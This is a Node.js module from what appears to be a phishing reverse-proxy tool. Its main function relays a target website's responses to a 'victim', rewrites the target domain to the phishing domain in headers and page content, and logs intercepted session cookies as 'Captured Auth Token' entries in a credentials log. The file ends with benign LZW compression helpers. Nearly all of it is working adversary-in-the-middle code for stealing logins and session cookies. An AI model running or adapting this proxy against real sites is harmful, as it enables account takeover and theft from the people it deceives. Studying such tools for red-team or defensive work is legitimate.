module.exports = {
  //return the function each time in order to get context of the script
  //http://www.jstips.co/en/javascript/passing-arguments-to-callback-functions
  //This is where the key technique is implemented. Keep in mind that the context of this returned function is index.js so we have access to all the imported modules. <3 Node.js
  humbleProxy: function(victim_request, humble_response) {
    return function(res) {
      //log who is asking our server for which pages
      console.log(info + dateFormat("isoDateTime") + " " + "Request: " + victim_request.x_real_ip + ": " + res.statusCode + " " + http_method + " " + requested_domain + url.parse(victim_request.url).path)
      access_log.write("[*]" + dateFormat("isoDateTime") + " " + "Request: " + victim_request.x_real_ip + ": " + res.statusCode + " " + http_method + " " + requested_domain + url.parse(victim_request.url).path + "\n")
      humble_response.statusCode = res.statusCode;
      humble_response.statusMessage = res.statusMessage;
      //console.log(options)
      modified_headers = JSON.stringify(res.headers).replace(substitution_regex, humble_domain)
      headers = JSON.parse(modified_headers)
      //handle cookies seprately so they are set with the proper repeat headers
      set_cookies = headers["set-cookie"]
      //use the global semaphore to set our own cookie if the config is set for it
      if (set_cookie) {
	try {
          param_search_regex = new RegExp(config[humble_domain].search_string + '=([^\&]*)')
          //param_search_regex = new RegExp(config[humble_domain].search_string + '=[^\&]*')
          //tracking_value = victim_request.url.match(param_search_regex)[0].split('=')[1]
          tracking_value = victim_request.url.match(param_search_regex)[1]
          set_cookies.push(config[humble_domain].tracking_cookie + "=" + tracking_value + ";domain=" + humble_domain + ";Path=/;Secure;httponly")
          //switch the semaphore back off
          set_cookie = false
        } catch(err) {
          set_cookies = []
          try{
            param_search_regex = new RegExp(config[humble_domain].search_string + '=[^\&]*')
            tracking_value = victim_request.url.match(param_search_regex)[0].split('=')[1]
            set_cookies.push(config[humble_domain].tracking_cookie + "=" + tracking_value + ";domain=" + humble_domain + ";Path=/;Secure;httponly")
	  }catch(err){
            set_cookies.push(config[humble_domain].tracking_cookie + "=" + "rogue_click" + ";domain=" + humble_domain + ";Path=/;Secure;httponly")
	  }
          set_cookie = false
          res.headers["set-cookie"] = set_cookies
        }
      }
	
      if (set_cookies) {
        console.log(success + dateFormat("isoDateTime") + " " + "Captured Auth Token for " + options.host + options.path + ": " + JSON.stringify(set_cookies))
        creds_log.write("[+]" + dateFormat("isoDateTime") + " " + "Captured Auth Token for " + options.host + options.path + ": " + JSON.stringify(set_cookies) + "\n")
        access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Captured Auth Token for " + options.host + options.path + ": " + JSON.stringify(set_cookies) + "\n")
      }
      var keys = Object.keys(res.headers)
      while (keys.length > 0) {
        var key = String(keys.pop())
	if (key.toLowerCase() == "set-cookie") {
	  humble_response.setHeader("Set-Cookie", set_cookies)
	} else {
	  try {
	    var value = res.headers[key].replace(substitution_regex, humble_domain)
            humble_response.setHeader(key , value)
	  } catch(err) {
            console.log(fail + dateFormat("isoDateTime") + " " + "Something Wrong with header: " + key)
            error_log.write("[-]" + dateFormat("isoDateTime") + " " + "Something Wrong with header: " + key + "\n")
            access_log.write("[-]" + dateFormat("isoDateTime") + " " + "Something Wrong with header: " + key + "\n")
	  }
	}
      }//finish setting up translated headers
     //set any custom headers
      try{
        custom_headers = config[humble_domain].custom_headers
        Object.keys(custom_headers).forEach(function(key) {
          humble_response.setHeader(key.toLowerCase(), custom_headers[key])
        });
      }catch(err){
        console.log(fail + dateFormat("isoDateTime") + " " + "Something Wrong with custom header: " + err)
        error_log.write("[-]" + dateFormat("isoDateTime") + " " + "Something Wrong with custom header: " + err + "\n")
        access_log.write("[-]" + dateFormat("isoDateTime") + " " + "Something Wrong with custom header: " + err + "\n")
      }
 
      var bufs = [];
      res.on('data', function(chunk) { 
        try {
	  //build up data from text files to make replacements in the DOM
	  //still need to work on .js for some reason we don't always get the whole file
          //if (/text|script|htm|style|document/.test(humble_response.getHeader('Content-Type').toLowerCase())) {
          if (/htm|style|document/.test(humble_response.getHeader('Content-Type').toLowerCase())) {
            //build up an array of buffers with the (compressed) text data stream for later concat, inflate, replace, compress and send
            bufs.push(chunk);
            //humble_response.write(replace(chunk, target, humble_domain));
          } else {
            //we don't need to replace anything so just send the raw data
            humble_response.write(chunk);
          }
        } catch(err) {
          console.log(fail + dateFormat("isoDateTime") + " " + "Couldn't get content type" + err)
          error_log.write("[-]" + dateFormat("isoDateTime") + " " + "Couldn't get content type\n")
          access_log.write("[-]" + dateFormat("isoDateTime") + " " + "Couldn't get content type\n")
          humble_response.write(chunk);
        }
      });
  
      res.on('end', function() {
        //if we built up the buffer, then we need to do some replacements on text data. Deflate first...
        if (bufs.length > 0){
          humble_response.setHeader("Content-Encoding", "identity")
          buf = Buffer.concat(bufs)
          decoded = ""
          replaced = ""
          switch (res.headers['content-encoding']) {
            // or, just use zlib.createUnzip() to handle both cases
            case 'gzip':
              decoded = zlib.gunzipSync(buf);
              break;
            case 'deflate':
              decoded = zlib.inflateSync(buf);
              break;
            case 'compress':
              decoded = chameleon.lzw_decode(buf);
              break;
            case 'br':
              decoded = brotli.decompress(buf);
              break;
            default:
              decoded = buf;
              break;
          }
          try{
	  //perform any additional custom replacements first
            replacements = config[humble_domain].replacements
          }catch(err){
            replacements = {"dummy_string": "dummy_string"}
	  }
          Object.keys(replacements).forEach(function(key) {
            decoded = replace(decoded, key, replacements[key])
          });
	  //generic target_domain to phishing_domain replacement
          replaced = replace(decoded, target, humble_domain).toString()
          content_len = replaced.length
          humble_response.setHeader("Content-Length", content_len)
          humble_response.write(replaced)
        }
	//close the connection to the victim
        humble_response.end()
      });
    }
  },


  // LZW-compress a string
  compress: function lzw_encode(s) {
    var dict = {};
    var data = (s + "").split("");
    var out = [];
    var currChar;
    var phrase = data[0];
    var code = 256;
    for (var i=1; i<data.length; i++) {
        currChar=data[i];
        if (dict[phrase + currChar] != null) {
            phrase += currChar;
        }
        else {
            out.push(phrase.length > 1 ? dict[phrase] : phrase.charCodeAt(0));
            dict[phrase + currChar] = code;
            code++;
            phrase=currChar;
        }
    }
    out.push(phrase.length > 1 ? dict[phrase] : phrase.charCodeAt(0));
    for (var i=0; i<out.length; i++) {
        out[i] = String.fromCharCode(out[i]);
    }
    return out.join("");
  },

  // Decompress an LZW-encoded string
  decompress: function lzw_decode(s) {
    var dict = {};
    var data = (s + "").split("");
    var currChar = data[0];
    var oldPhrase = currChar;
    var out = [currChar];
    var code = 256;
    var phrase;
    for (var i=1; i<data.length; i++) {
        var currCode = data[i].charCodeAt(0);
        if (currCode < 256) {
            phrase = data[i];
        }
        else {
           phrase = dict[currCode] ? dict[currCode] : (oldPhrase + currChar);
        }
        out.push(phrase);
        currChar = phrase.charAt(0);
        dict[code] = oldPhrase + currChar;
        code++;
        oldPhrase = phrase;
    }
    return out.join("");
  }
}
